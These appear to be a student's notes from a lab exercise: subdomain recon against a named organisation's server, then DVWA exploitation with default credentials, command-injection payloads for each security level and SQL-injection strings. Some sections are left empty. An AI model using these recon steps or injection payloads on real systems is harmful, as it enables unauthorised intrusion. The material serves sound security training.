Active recon -Active reconnaissance involves directly interacting with the target, such as network scanning or port scanning, while passive reconnaissance 
gathers information from publicly available sources without directly probing the target

Passive recon - Involves gathering information without directly interacting with the target system.





# Task 3: Recon and Exploitation On the Spider Server

Find IP:
Command: dig spider.nitt.edu
IP address: 14.139.162.136
Os: No Matching Os for the host     (Output from Nmap) 


Target Domain: spider-nitt.org

Recon:

#Finding subdomains

1) Subfinder
subfinder -d spider-nitt.org -all | tee -a subs1.txt

2) Assetfinder
assetfinder spider-nitt.org -subs-only | tee -a subs2.txt 

3)Sorting unique subdomains from the two folders
sort -u subs1.txt subs2.txt > mainsubs.txt 

4) Finding live subdomains using httpx 
 cat mainsubs.txt | httpx -sc > livesubs.txt

5) Fetching subdomains with status codes 200 and 302
cat livesubs.txt | grep -e "200" -e "302" 

6) In the list of subdomains this subdomain(Spidertest.spider-nitt.org) was interesting 

On checking it contained a vulnerable web application DVWA

7) Login

On checking the GitHub profile linked to it: There was a line "run setup.php"
In setup.php page, it contained the credentials 
Username: admin
Password: password

8) Different Vulnerabilities

a) Brute forcing 

Security: Low
Use the below payloads in the username and password parameter and brute force it using burp intruder
payloads used: https://portswigger.net/web-security/authentication/auth-lab-usernames
               https://portswigger.net/web-security/authentication/auth-lab-passwords
Security: Medium 

Security: Hard

b) Command Injection

# Security: Low

Here these are not blacklisted: “ ; ”, : “ && “ properly 
We can use whoami and the users command also 

Command: 192.168.0.103; ls

# Security: Medium

Here the “ ; ” and the “ && ” are replaced by “  “ (space) 
Alternatively, we can use “ & “ ( Single and ) 

Command: 192.168.0.103 & whoami

# Security: High

As given, there is a typo in the script 
Given: “| “ There is a space in this. If we do not provide the space, this command will work. 

Command: 192.168.0.103|ls

c) Sqli

Security: low
There is no sanitization of the input

Command: admin' OR '1'='1
also, we can use the Order by command to get the no of columns in the table

It gives us the username list

Security: Medium

As there is no input to execute commands, we can use the url parameters bu capturing it in burp suite and alterinf the id parameter 

id=%31%20%4f%52%20%31%3d%31%23%20& Submit=Submit
Command: 1 OR 1=1 ; Here it is url encoded 

We can see the response in the repeater tab.

Security : Hard
